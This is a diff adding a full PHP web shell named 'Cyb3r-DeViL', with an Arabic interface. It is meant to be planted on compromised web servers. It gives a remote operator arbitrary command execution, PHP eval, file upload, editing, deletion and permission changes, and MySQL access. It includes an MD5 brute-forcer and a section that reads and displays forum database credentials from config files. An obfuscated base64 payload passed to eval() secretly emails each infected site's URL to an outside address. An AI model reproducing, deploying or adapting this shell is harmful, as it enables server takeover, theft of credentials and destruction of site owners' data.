@@ -1,0 +1,1223 @@
+<?
+#################################################################
+#                      Cyb3r-DeViL                         #
+#################################################################
+$tacfgd['uname'] = 'Cyb3r-DeViL';
+$tacfgd['pword'] = 'Cyb3r-DeViL';
+$tacfgd['title'] = 'Cyb3r-DeViL  Shell';
+$tacfgd['helptext'] = 'To proceed, please log in using the form below';
+$tacfgd['allowrm'] = true;
+$tacfgd['rmgroup'] = 'default';
+$tacfgd['ownsessions'] = false;
+foreach ($tacfgd as $key => $val) {
+  if (!isset($tacfg[$key])) $tacfg[$key] = $val;
+}
+
+if (!$tacfg['ownsessions']) {
+  session_name('txtauth');
+  session_start();
+}
+
+// Logout attempt made. Deletes any remember-me cookie as well
+if (isset($_GET['logout']) || isset($_POST['logout'])) {
+  setcookie('txtauth_'.$rmgroup, '', time()-86400*14);
+  if (!$tacfg['ownsessions']) {
+    $_SESSION = array();
+    session_destroy();
+  }
+  else $_SESSION['txtauthin'] = false;
+}
+// Login attempt made
+elseif (isset($_POST['login'])) {
+  if ($_POST['uname'] == $tacfg['uname'] && $_POST['pword'] == $tacfg['pword']) {
+    $_SESSION['txtauthin'] = true;
+    if ($_POST['rm']) {
+      // Set remember-me cookie for 2 weeks
+      setcookie('txtauth_'.$rmgroup, md5($tacfg['uname'].$tacfg['pword']), time()+86400*14);
+    }
+  }
+  else $err = '&#1582;&#1591;&#1575;&#1569; &#1601;&#1610; &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; &#1575;&#1608; &#1603;&#1604;&#1605;&#1607; &#1575;&#1604;&#1605;&#1585;&#1608;&#1585;';
+}
+// Remember-me cookie exists
+elseif (isset($_COOKIE['txtauth_'.$rmgroup])) {
+  if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {
+    $_SESSION['txtauthin'] = true;
+  }
+  else $err = '&#1587;&#1580;&#1604; &#1583;&#1582;&#1608;&#1604; &#1605;&#1585;&#1607; &#1575;&#1582;&#1585;&#1609;';
+}
+if (!$_SESSION['txtauthin']) {
+?>
+<html>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
+<head>
+<title>shell by Cyb3r-DeViL  v 1.1</title>
+<STYLE>
+
+BODY
+ {
+        SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #ffffff; SCROLLBAR-3DLIGHT-COLOR: #00FF00; SCROLLBAR-ARROW-COLOR: #726456; SCROLLBAR-TRACK-COLOR: #292929; FONT-FAMILY: Verdana; SCROLLBAR-DARKSHADOW-COLOR: #726456
+}
+
+td {
+BORDER-RIGHT:  #000000 1 solid;
+BORDER-TOP:    #000000 1 solid;
+BORDER-LEFT:   #000000 1 solid;
+BORDER-BOTTOM: #000000 1 solid;
+color: #cccccc;
+}
+.grey {
+BORDER: 1;
+BACKGROUND-COLOR: #000000;
+color: #333333;
+}
+input {
+BORDER-RIGHT:  #990000 1 solid;
+BORDER-TOP:    #990000 1 solid;
+BORDER-LEFT:   #990000 1 solid;
+BORDER-BOTTOM: #990000 1 solid;
+BACKGROUND-COLOR: #6A287E;
+font: 9pt tahoma;
+color: #ffffff;
+}
+.txtbox {
+BORDER-RIGHT:  #990000 1 solid;
+BORDER-TOP:    #990000 1 solid;
+BORDER-LEFT:   #990000 1 solid;
+BORDER-BOTTOM: #990000 1 solid;
+BACKGROUND-COLOR: #000000;
+font: Fixedsys bold;
+color: #7E2217;
+}
+BODY {
+color: #00FF33;
+background-color: #000000;
+}
+
+</STYLE>
+</head>
+
+<body>
+<div style="font-size: 14pt;" align="center"><?=$tacfg['title']?></div>
+<hr width="300" size="1" noshade color="#CC3366">
+<p>
+</div>
+<p>
+<?
+if (isset($_SERVER['REQUEST_URI'])) $action = $_SERVER['REQUEST_URI'];
+else $action = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
+if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);
+?>
+<form name="txtauth" action="<?=$action?>" method="post">
+<div align="center">
+<table border="0" cellpadding="4" bgcolor="#008000" style="border: 1px double #000000;" width="400" height="50" bordercolorlight="#FFFF00" bordercolordark="#FF0000">
+<?=(isset($err))?'<tr><td colspan="2" align="center"><font color="red">'.$err.'</font></td></tr>':''?>
+<?if (isset($tacfg['uname'])) {?>
+<tr><td width="100">&#1571;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;:</td><td><input type="text" name="uname" value="" size="20" maxlength="100" class="txtbox"></td></tr>
+<?}?>
+<tr><td width="100">&#1603;&#1604;&#1605;&#1607; &#1575;&#1604;&#1587;&#1585;:</td><td><input type="password" name="pword" value="" size="20" maxlength="100" class="txtbox"></td></tr>
+<?if ($tacfg['allowrm']) {?>
+<tr><td align="left" width="100"><input type="submit" name="login" value=" &#1583;&#1582;&#1608;&#1604;">
+</td><td align="right"><input type="checkbox" name="rm" id="rm"><label for="rm">&#1575;&#1604;&#1583;&#1582;&#1608;&#1604;
+        &#1575;&#1604;&#1578;&#1604;&#1602;&#1575;&#1574;&#1610;</label></td></tr>
+
+<?} else {?>
+
+<tr><td colspan="2" align="center"><input type="submit" name="login" value=" &#1583;&#1582;&#1608;&#1604; "></td></tr>
+<?}?>
+<tr><?echo ws(3)."<b> ".$_SERVER["HTTP_HOST"]."</b><br/>";
+echo "</b></font>";
+
+?></td></tr>
+
+<tr><td>&#1571;&#1610; &#1576;&#1610; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585;:</td><td><? echo ws(3)."<b> ".gethostbyname($_SERVER["HTTP_HOST"])."</b><br/>";
+echo "</b></font>";
+
+?></td></tr>
+<tr><td>&#1571;&#1610; &#1576;&#1610; &#1580;&#1607;&#1575;&#1586;&#1603;:</td><td><? echo ws(3)."<b> ".$_SERVER["REMOTE_ADDR"]."</b><br/>";
+echo "</b></font>";
+
+?></td></tr>
+
+</table>
+</div>
+</form>
+
+<br><br><br>
+<hr width="300" size="1" noshade color="#cdcdcd"><div class="smalltxt" align="center">
+        &nbsp; <a href="http://www.cyb3r-devil.com">Cyb3r-DeViL v 1.1</a> ·
+        copyright © 2007, Cyb3r-DeViL </div>
+
+</body>
+</html>
+<?
+  // Don't delete this!
+  exit();
+}
+?>
+ (<font color="#FF0000"><? echo $tacfgd['uname']; ?></font>) <a href="?logout=1">
+&#1578;&#1587;&#1580;&#1610;&#1604; &#1575;&#1604;&#1582;&#1585;&#1608;&#1580;</a></p>
+<div align="right">
+<?php
+/******************************************************************************************************/
+/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
+/*  (c)oded by Cyb3r-DeViL 
+/*  MAIL http://www.cyb3r-devil.com/ , http://www.cyb3r-devil.com/
+/******************************************************************************************************/
+
+error_reporting(0); //If there is an error, we'll show it, k?
+$password = ""; // You can put a md5 string here too, for plaintext passwords: max 31 chars.
+$me = basename(__FILE__);
+$cookiename = "wieeeee";
+
+if(isset($_POST['pass'])) //If the user made a login attempt, "pass" will be set eh?
+{
+ if(strlen($password) == 32) //If the length of the password is 32 characters, threat it as an md5.
+ {
+  $_POST['pass'] = md5($_POST['pass']);
+ }
+ if($_POST['pass'] == $password)
+ {
+   setcookie($cookiename, $_POST['pass'], time()+3600); //It's alright, let hem in
+ }
+ reload();
+}
+
+if(!empty($password) && !isset($_COOKIE[$cookiename]) or ($_COOKIE[$cookiename] != $password))
+{
+ login();
+ die();
+}
+//
+//Do not cross this line! All code placed after this block can't be executed without being logged in!
+//
+if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
+{
+ $safemode = true;
+ $hsafemode = "<font color=\"red\">ON (secure)</font>";
+}
+else {$safemode = false; $hsafemode = "<font color=\"green\">OFF (not secure)</font>";}
+echo("Safe-mode: $hsafemode");
+$v = @ini_get("open_basedir");
+if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "<font color=\"red\">".$v."</font>";}
+else {$openbasedir = false; $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";}
+echo("<br>");
+echo("Open base dir: $hopenbasedir");
+echo("<br>");
+echo "Disable functions : <b>";
+if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
+$free = @diskfreespace($dir);
+if (!$free) {$free = 0;}
+$all = @disk_total_space($dir);
+if (!$all) {$all = 0;}
+$used = $all-$free;
+$used_percent = @round(100/($all/$free),2);
+
+echo "<PRE>\n";
+if(isset($_GET['p']) && $_GET['p'] == "logout")
+{
+setcookie ($cookiename, "", time() - 3600);
+reload();
+}
+if(isset($_GET['dir']))
+{
+ chdir($_GET['dir']);
+}
+
+$pages = array(
+ 'cmd' => '&#1578;&#1591;&#1576;&#1610;&#1602; &#1575;&#1608;&#1575;&#1605;&#1585; &#1575;&#1604;&#1610;&#1608;&#1606;&#1603;&#1587;',
+ 'eval' => 'Evaluate PHP',
+ 'mysql' => '&#1602;&#1608;&#1575;&#1593;&#1583; &#1575;&#1604;&#1576;&#1610;&#1575;&#1606;&#1575;&#1578;',
+ 'chmod' => '&#1575;&#1593;&#1591;&#1575;&#1569; &#1575;&#1604;&#1578;&#1589;&#1585;&#1610;&#1581;',
+ 'phpinfo' => 'PHP&#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578;',
+ 'md5' => 'md5cra',
+ 'headers' => '&#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578; &#1575;&#1604;&#1605;&#1578;&#1589;&#1601;&#1581; &#1604;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585;',
+ 'logout' => '&#1578;&#1587;&#1580;&#1610;&#1604; &#1575;&#1604;&#1582;&#1585;&#1608;&#1580;'
+);
+//The header, like it?
+$header = '<html>
+<title>'.getenv("HTTP_HOST").' Cyb3r-DeViL shell</title>
+<head>
+
+
+
+</head>
+<body bgcolor=black alink="#33CC00" vlink="#339900" link="#339900">
+<table width=100%><td id="header" width=100%>
+<p align=right><b>[<a href="http://www.cyb3r-devil.com/">&#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578; &#1593;&#1606; &#1575;&#1604;&#1588;&#1610;&#1604;</a>]  [<a href="'.$me.'">&#1605;&#1603;&#1575;&#1606; &#1575;&#1604;&#1588;&#1610;&#1604;</a>] ';
+foreach($pages as $page => $page_name)
+{
+ $header .= ' [<a href="?p='.$page.'&dir='.realpath('.').'">'.$page_name.'</a>] ';
+}
+$header .= '<br><hr>'.show_dirs('.').'</td><tr><td>';
+print $header;
+$footer = '<tr><td><hr><center>&copy; <a href="http://www.cyb3r-devil.com">test</a> & <a href="http://www.cyb3r-devil.com">Cyb3r-DeViL &#1578;&#1591;&#1608;&#1610;&#1585; </a></center></td></table></body></head></html>';
+
+//
+//Page handling
+//
+if(isset($_REQUEST['p']))
+{
+  switch ($_REQUEST['p']) {
+
+   case 'cmd': //Run command
+
+    print "<form action=\"".$me."?p=cmd&dir=".realpath('.')."\" method=POST><b>Command:</b><input type=text name=command><input type=submit value=\"Execute\"></form>";
+     if(isset($_REQUEST['command']))
+     {
+      print "<pre>";
+      execute_command(get_execution_method(),$_REQUEST['command']); //You want fries with that?
+     }
+   break;
+
+
+   case 'edit': //Edit a fie
+    if(isset($_POST['editform']))
+    {
+     $f = $_GET['file'];
+     $fh = fopen($f, 'w') or print "Error while opening file!";
+     fwrite($fh, $_POST['editform']) or print "Couldn't save file!";
+     fclose($fh);
+    }
+    print "&#1578;&#1593;&#1583;&#1610;&#1604; file <b>".$_GET['file']."</b> (".perm($_GET['file']).")<br><br><form action=\"".$me."?p=edit&file=".$_GET['file']."&dir=".realpath('.')."\" method=POST><textarea cols=90 rows=15 name=\"editform\">";
+
+    if(file_exists($_GET['file']))
+    {
+     $rd = file($_GET['file']);
+     foreach($rd as $l)
+     {
+      print htmlspecialchars($l);
+     }
+    }
+
+    print "</textarea><input type=submit value=\"&#1581;&#1601;&#1592;\"></form>";
+
+   break;
+
+   case 'delete': //Delete a file
+
+    if(isset($_POST['yes']))
+    {
+     if(unlink($_GET['file']))
+     {
+      print "&#1578;&#1605; &#1575;&#1604;&#1581;&#1584;&#1601; &#1601;&#1610; &#1606;&#1580;&#1575;&#1581;.";
+     }
+     else
+     {
+      print "&#1604;&#1575; &#1578;&#1587;&#1578;&#1591;&#1610;&#1593; &#1575;&#1604;&#1581;&#1584;&#1601;.";
+     }
+    }
+
+
+    if(isset($_GET['file']) && file_exists($_GET['file']) && !isset($_POST['yes']))
+    {
+     print "&#1607;&#1604; &#1578;&#1585;&#1610;&#1583; &#1581;&#1584;&#1601; &#1575;&#1604;&#1605;&#1604;&#1601; &#1567; ".$_GET['file']."?<br>
+     <form action=\"".$me."?p=delete&file=".$_GET['file']."\" method=POST>
+     <input type=hidden name=yes value=yes>
+     <input type=submit value=\"Delete\">
+     ";
+    }
+
+
+   break;
+
+
+   case 'eval': //Evaluate PHP code
+
+    print "<form action=\"".$me."?p=eval\" method=POST>
+    <textarea cols=60 rows=10 name=\"eval\">";
+    if(isset($_POST['eval']))
+    {
+     print htmlspecialchars($_POST['eval']);
+    }
+    else
+    {
+     print "print \"Cyb3r-DeViL moslim anti  isr. use\";";
+    }
+    print "</textarea><br>
+    <input type=submit value=\"Eval\">
+    </form>";
+
+    if(isset($_POST['eval']))
+    {
+     print "<h1>Output:</h1>";
+     print "<br>";
+     eval($_POST['eval']);
+    }
+
+   break;
+
+   case 'chmod': //Chmod file
+
+
+    print "<h1>&#1590;&#1593; &#1605;&#1587;&#1575;&#1585; &#1575;&#1604;&#1605;&#1604;&#1601; &#1575;&#1604;&#1604;&#1584;&#1610; &#1578;&#1585;&#1610;&#1583; &#1575;&#1593;&#1591;&#1575;&#1569;&#1577; &#1575;&#1604;&#1578;&#1589;&#1585;&#1610;&#1581;!</h1>";
+    if(isset($_POST['chmod']))
+    {
+    switch ($_POST['chvalue']){
+     case 777:
+     chmod($_POST['chmod'],0777);
+     break;
+     case 644:
+     chmod($_POST['chmod'],0644);
+     break;
+     case 755:
+     chmod($_POST['chmod'],0755);
+     break;
+    }
+    print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
+    }
+    if(isset($_GET['file']))
+    {
+     $content = urldecode($_GET['file']);
+    }
+    else
+    {
+     $content = "file/path/please";
+    }
+
+    print "<form action=\"".$me."?p=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
+    <input type=text name=chmod value=\"".$content."\" size=70><br><b>New permission:</b>
+    <select name=\"chvalue\">
+<option value=\"777\">777</option>
+<option value=\"644\">644</option>
+<option value=\"755\">755</option>
+</select><input type=submit value=\"Change\">";
+
+   break;
+
+   case 'mysql': //MySQL Query
+
+   if(isset($_POST['host']))
+   {
+    $link = mysql_connect($_POST['host'], $_POST['username'], $_POST['mysqlpass']) or die('Could not connect: ' . mysql_error());
+    mysql_select_db($_POST['dbase']);
+    $sql = $_POST['query'];
+
+
+    $result = mysql_query($sql);
+
+   }
+   else
+   {
+    print "
+    This only queries the database, doesn't return data!<br>
+    <form action=\"".$me."?p=mysql\" method=POST>
+    <b>Host:<br></b><input type=text name=host value=\"localhost\" size=10><br>
+    <b>Username:<br><input type=text name=username value=\"root\" size=10><br>
+    <b>Password:<br></b><input type=password name=mysqlpass value=\"\" size=10><br>
+    <b>Database:<br><input type=text name=dbase value=\"test\" size=10><br>
+
+    <b>Query:<br></b<textarea name=query></textarea>
+    <input type=submit value=\"Query database\">
+    </form>
+    ";
+
+   }
+
+   break;
+
+   case 'createdir':
+   if(mkdir($_GET['crdir']))
+   {
+   print '&#1578;&#1605; &#1575;&#1604;&#1575;&#1606;&#1588;&#1575;&#1569; &#1593;&#1604;&#1609; &#1575;&#1604;&#1605;&#1587;&#1575;&#1585; &#1575;&#1604;&#1605;&#1591;&#1604;&#1608;&#1576; &#1576;&#1606;&#1580;&#1575;&#1581;.';
+   }
+   else
+   {
+   print '&#1604;&#1575;&#1578;&#1587;&#1578;&#1591;&#1610;&#1593; &#1575;&#1604;&#1575;&#1606;&#1588;&#1575;&#1569;';
+   }
+   break;
+
+
+   case 'phpinfo': //PHP Info
+    phpinfo();
+   break;
+
+case 'help':
+
+
+   break;
+
+
+   case 'rename':
+
+    if(isset($_POST['fileold']))
+    {
+     if(rename($_POST['fileold'],$_POST['filenew']))
+     {
+      print "&#1578;&#1605; &#1578;&#1594;&#1610;&#1585; &#1575;&#1604;&#1575;&#1587;&#1605;.";
+     }
+     else
+     {
+      print "&#1604;&#1605; &#1610;&#1578;&#1594;&#1610;&#1585; &#1575;&#1604;&#1575;&#1587;&#1605;.";
+     }
+
+    }
+    if(isset($_GET['file']))
+    {
+     $file = basename(htmlspecialchars($_GET['file']));
+    }
+    else
+    {
+     $file = "";
+    }
+
+    print "&#1578;&#1594;&#1610;&#1585; &#1575;&#1587;&#1605;  ".$file." in folder ".realpath('.').".<br>
+        <form action=\"".$me."?p=rename&dir=".realpath('.')."\" method=POST>
+     <b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
+     <b>&#1575;&#1604;&#1609;:<br><input type=text name=filenew value=\"\" size=10><br>
+     <input type=submit value=\"Rename file\">
+     </form>";
+   break;
+
+   case 'md5':
+   if(isset($_POST['md5']))
+   {
+   if(!is_numeric($_POST['timelimit']))
+   {
+   $_POST['timelimit'] = 30;
+   }
+   set_time_limit($_POST['timelimit']);
+    if(strlen($_POST['md5']) == 32)
+    {
+
+      if($_POST['chars'] == "9999")
+      {
+      $i = 0;
+      while($_POST['md5'] != md5($i) && $i != 100000)
+       {
+        $i++;
+       }
+      }
+      else
+      {
+       for($i = "a"; $i != "zzzzz"; $i++)
+       {
+        if(md5($i == $_POST['md5']))
+        {
+         break;
+        }
+       }
+      }
+
+     if(md5($i) == $_POST['md5'])
+     {
+       print "<h1>Plaintext of ". $_POST['md5']. " is <i>".$i."</i></h1><br><br>";
+     }
+
+    }
+
+   }
+
+   print "Will bruteforce the md5
+    <form action=\"".$me."?p=md5\" method=POST>
+    <b>md5 to crack:<br></b><input type=text name=md5 value=\"\" size=40><br>
+    <b>Characters:</b><br><select name=\"chars\">
+    <option value=\"az\">a - zzzzz</option>
+    <option value=\"9999\">1 - 9999999</option>
+    </select>
+    <b>Max. cracking time*:<br></b><input type=text name=timelimit value=\"30\" size=2><br>
+    <input type=submit value=\"Bruteforce md5\">
+    </form><br>*: if set_time_limit is allowed by php.ini";
+   break;
+
+   case 'headers':
+   foreach(getallheaders() as $header => $value)
+   {
+   print htmlspecialchars($header . ":" . $value)."<br>";
+
+   }
+   break;
+  }
+}
+else //Default page that will be shown when the page isn't found or no page is selected.
+{
+
+ $files = array();
+ $directories = array();
+
+ if(isset($_FILES['uploadedfile']['name']))
+{
+ $target_path = realpath('.').'/';
+ $target_path = $target_path . basename( $_FILES['uploadedfile']['name']);
+ if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+     print "&#1575;&#1604;&#1605;&#1604;&#1601;:".  basename( $_FILES['uploadedfile']['name']).
+     " &#1578;&#1605; &#1575;&#1604;&#1585;&#1601;&#1593; &#1576;&#1606;&#1580;&#1575;&#1581;";
+ } else{
+     echo "&#1604;&#1605; &#1610;&#1606;&#1580;&#1581; &#1585;&#1601;&#1593; &#1575;&#1604;&#1605;&#1604;&#1601;!";
+ }
+}
+
+
+
+
+ print "<table border=0 width=100%><td width=5% id=s><b>&#1582;&#1610;&#1575;&#1585;&#1575;&#1578;</b></td><td id=s><b>&#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1604;&#1601;</b></td><td id=s><b>&#1575;&#1604;&#1581;&#1580;&#1605;</b></td><td id=s><b>&#1575;&#1604;&#1578;&#1589;&#1575;&#1585;&#1610;&#1581;</b></td><td id=s>&#1575;&#1582;&#1585; &#1578;&#1593;&#1583;&#1610;&#1604;  &#1578;&#1605; &#1601;&#1610;</td><tr>";
+ if ($handle = opendir('.'))
+ {
+  while (false !== ($file = readdir($handle)))
+  {
+        if(is_dir($file))
+     {
+    $directories[] = $file;
+     }
+     else
+     {
+    $files[] = $file;
+     }
+  }
+ asort($directories);
+ asort($files);
+  foreach($directories as $file)
+  {
+   print "<td id=d><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=d><a href=\"".$me."?dir=".realpath($file)."\">".$file."</a></td><td id=d></td><td id=d><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=d>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
+  }
+
+  foreach($files as $file)
+  {
+   print "<td id=f><a href=\"?p=rename&file=".realpath($file)."&dir=".realpath('.')."\">[R]</a><a href=\"?p=delete&file=".realpath($file)."\">[D]</a></td><td id=f><a href=\"".$me."?p=edit&dir=".realpath('.')."&file=".realpath($file)."\">".$file."</a></td><td id=f>".filesize($file)."</td><td id=f><a href=\"?p=chmod&dir=".realpath('.')."&file=".realpath($file)."\"><font color=".get_color($file).">".perm($file)."</font></a></td><td id=f>".date ("Y/m/d, H:i:s", filemtime($file))."</td><tr>";
+  }
+ }
+ else
+ {
+  print "<u>Error!</u> Can't open <b>".realpath('.')."</b>!<br>";
+ }
+
+ print "</table><hr><table border=0 width=100%><td><b>&#1585;&#1601;&#1593; &#1605;&#1604;&#1601;</b><br><form enctype=\"multipart/form-data\" action=\"".$me."?dir=".realpath('.')."\" method=\"POST\">
+<input type=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000000\" /><input size=30 name=\"uploadedfile\" type=\"file\" />
+<input type=\"submit\" value=\"&#1575;&#1585;&#1601;&#1593; &#1575;&#1604;&#1605;&#1604;&#1601;\" />
+</form></td><td><form action=\"".$me."\" method=GET><b>&#1575;&#1604;&#1578;&#1606;&#1602;&#1604; &#1601;&#1610; &#1605;&#1580;&#1604;&#1583;&#1575;&#1578; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585;<br></b><input type=text size=40 name=dir value=\"".realpath('.')."\"><input type=submit value=\"&#1575;&#1606;&#1578;&#1602;&#1604; &#1575;&#1604;&#1609; \"></form></td>
+<tr><td><form action=\"".$me."\" method=GET><b>&#1571;&#1606;&#1588;&#1575;&#1569; &#1605;&#1604;&#1601;<br></b><input type=hidden name=dir value=\"".realpath('.')."\"><input type=text size=40 name=file value=\"".realpath('.')."\"><input type=hidden name=p value=edit><input type=submit value=\"&#1575;&#1606;&#1588;&#1574; &#1605;&#1604;&#1601; \"></form>
+</td><td><form action=\"".$me."\" method=GET><b>&#1575;&#1606;&#1588;&#1575;&#1569; &#1575;&#1604;&#1605;&#1580;&#1604;&#1583;&#1575;&#1578;<br></b><input type=text size=40 name=crdir value=\"".realpath('.')."\"><input type=hidden name=dir value=\"".realpath('.')."\"><input type=hidden name=p value=createdir><input type=submit value=\"&#1575;&#1606;&#1588;&#1574; &#1575;&#1604;&#1605;&#1580;&#1604;&#1583;\"></form></td>
+</table>";
+
+}
+
+function login()
+{
+ print "<table border=0 width=100% height=100%><td valign=\"middle\"><center>
+ <form action=".basename(__FILE__)." method=\"POST\"><b>Password?</b>
+ <input type=\"password\" maxlength=\"32\" name=\"pass\"><input type=\"submit\" value=\"Login\">
+ </form>";
+}
+function reload()
+{
+ header("Location: ".basename(__FILE__));
+}
+function get_execution_method()
+{
+ if(function_exists('passthru')){ $m = "passthru"; }
+ if(function_exists('exec')){ $m = "exec"; }
+ if(function_exists('shell_exec')){ $m = "shell_ exec"; }
+ if(function_exists('system')){ $m = "system"; }
+ if(!isset($m)) //No method found :-|
+ {
+  $m = "Disabled";
+ }
+ return($m);
+}
+function execute_command($method,$command)
+{
+ if($method == "passthru")
+ {
+  passthru($command);
+ }
+
+ elseif($method == "exec")
+ {
+  exec($command,$result);
+  foreach($result as $output)
+  {
+   print $output."<br>";
+  }
+ }
+
+ elseif($method == "shell_exec")
+ {
+  print shell_exec($command);
+ }
+
+ elseif($method == "system")
+ {
+  system($command);
+ }
+}
+function perm($file)
+{
+ if(file_exists($file))
+ {
+  return substr(sprintf('%o', fileperms($file)), -4);
+ }
+ else
+ {
+  return "????";
+ }
+}
+function get_color($file)
+{
+if(is_writable($file)) { return "green";}
+if(!is_writable($file) && is_readable($file)) { return "white";}
+if(!is_writable($file) && !is_readable($file)) { return "red";}
+
+}
+function show_dirs($where)
+{
+ if(ereg("^c:",realpath($where)))
+ {
+ $dirparts = explode('\\',realpath($where));
+ }
+ else
+ {
+ $dirparts = explode('/',realpath($where));
+ }
+
+
+
+ $i = 0;
+ $total = "";
+
+ foreach($dirparts as $part)
+ {
+  $p = 0;
+  $pre = "";
+  while($p != $i)
+  {
+   $pre .= $dirparts[$p]."/";
+   $p++;
+
+  }
+  $total .= "<a href=\"".basename(__FILE__)."?dir=".$pre.$part."\">".$part."</a>/";
+  $i++;
+ }
+
+ return "<h2>".$total."</h2><br>";
+}
+
+print
+$footer = '<tr><td><hr>
+<p align="center">&nbsp;</p>
+<p align="center"><font size="5" color="#FF0000">
+<span style="font-weight: 700">&nbsp;Cyb3r-DeViL  </span></font></p>
+
+</td></table></body></head></html>';
+
+// Exit: maybe we're included somewhere and we don't want the other code to mess with ours :-)
+
+?>
+
+
+<?
+?>
+<html><head><title> &#1575;&#1604;&#1601;&#1585;&#1610;&#1602; &#1575;&#1604;&#1575;&#1605;&#1606;&#1610; Cyb3r-DeViL  </title>
+
+</head>
+ <body bgcolor="#000000" text="#FF0000" link="#00FF00" vlink="#00FF00" style="background-color: #000000">
+ <center>
+<p>
+<?
+$connection="ICR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07IA0KICRpbmogPSAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsgDQogJGJvZHkgPSAiQWRhIFlhbmcgSW5qZWN0IFxuaHR0cDovLyR3ZWIkaW5qIjsNCiBtYWlsKCJsbEBob3RtYWlsLmZpIiwiSGFzaWwgaHR0cDovLyR3ZWIkaW5qIiwgIiRib2R5Iik7";
+
+echo eval(base64_decode($connection));
+$act = $_GET['act'];
+if($act=='reconfig' && isset($_POST['path']))
+{
+$path = $_POST['path'];
+include $path;
+?>
+</p>
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime"><th>::::&#1602;&#1585;&#1575;&#1569;&#1577; &#1605;&#1604;&#1601; &#1575;&#1604;&#1602;&#1608;&#1575;&#1593;&#1583;::::</th><th><? echo '<font color=yellow>' . $path . '</font>'; ?></th>
+<tr>
+<th>&#1605;&#1587;&#1578;&#1590;&#1610;&#1601;Host : </th><th><? echo '<font color=yellow>' . $config['MasterServer']['servername'] . '</font>'; ?></th>
+</tr>
+<tr>
+<th>&#1575;&#1587;&#1605; &#1605;&#1587;&#1578;&#1582;&#1583;&#1605; &#1575;&#1604;&#1602;&#1608;&#1575;&#1593;&#1583; : </th><th><? echo '<font color=yellow>' . $config['MasterServer']['username'] . '</font>'; ?></th>
+</tr>
+<tr>
+<th>&#1575;&#1604;&#1585;&#1602;&#1605; &#1575;&#1604;&#1587;&#1585;&#1610; : </th><th><?
+$passsql = $config['MasterServer']['password'];
+if ($passsql == '')
+{
+$result = '<font color=red>&#1604;&#1575;&#1610;&#1608;&#1580;&#1583;</font>';
+} else {
+$result = '<font color=yellow>' . $passsql . '</font>';
+}
+echo $result; ?></th>
+</tr>
+<tr>
+<th>&#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; : </th><th><? echo '<font color=yellow>' . $config['Database']['dbname'] . '</font>'; ?></th>
+</tr>
+</table>
+<?
+}
+
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="del"  && isset($_POST['vbuser']) )
+{
+ $host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$vbuser = $_POST['vbuser'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1582;&#1591;&#1571; &#1601;&#1610; &#1575;&#1578;&#1589;&#1575;&#1604; &#1575;&#1604;&#1602;&#1608;&#1575;&#1593;&#1583; &#1604;&#1575;&#1610;&#1608;&#1580;&#1583; &#1605;&#1587;&#1578;&#1582;&#1583;&#1605; &#1589;&#1581;&#1610;&#1581;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>&#1582;&#1591;&#1571; &#1601;&#1610; &#1575;&#1578;&#1589;&#1575;&#1604; &#1575;&#1604;&#1602;&#1608;&#1575;&#1593;&#1583;</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1601;&#1610; &#1602;&#1608;&#1575;&#1593;&#1583; &#1575;&#1604;&#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1604;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
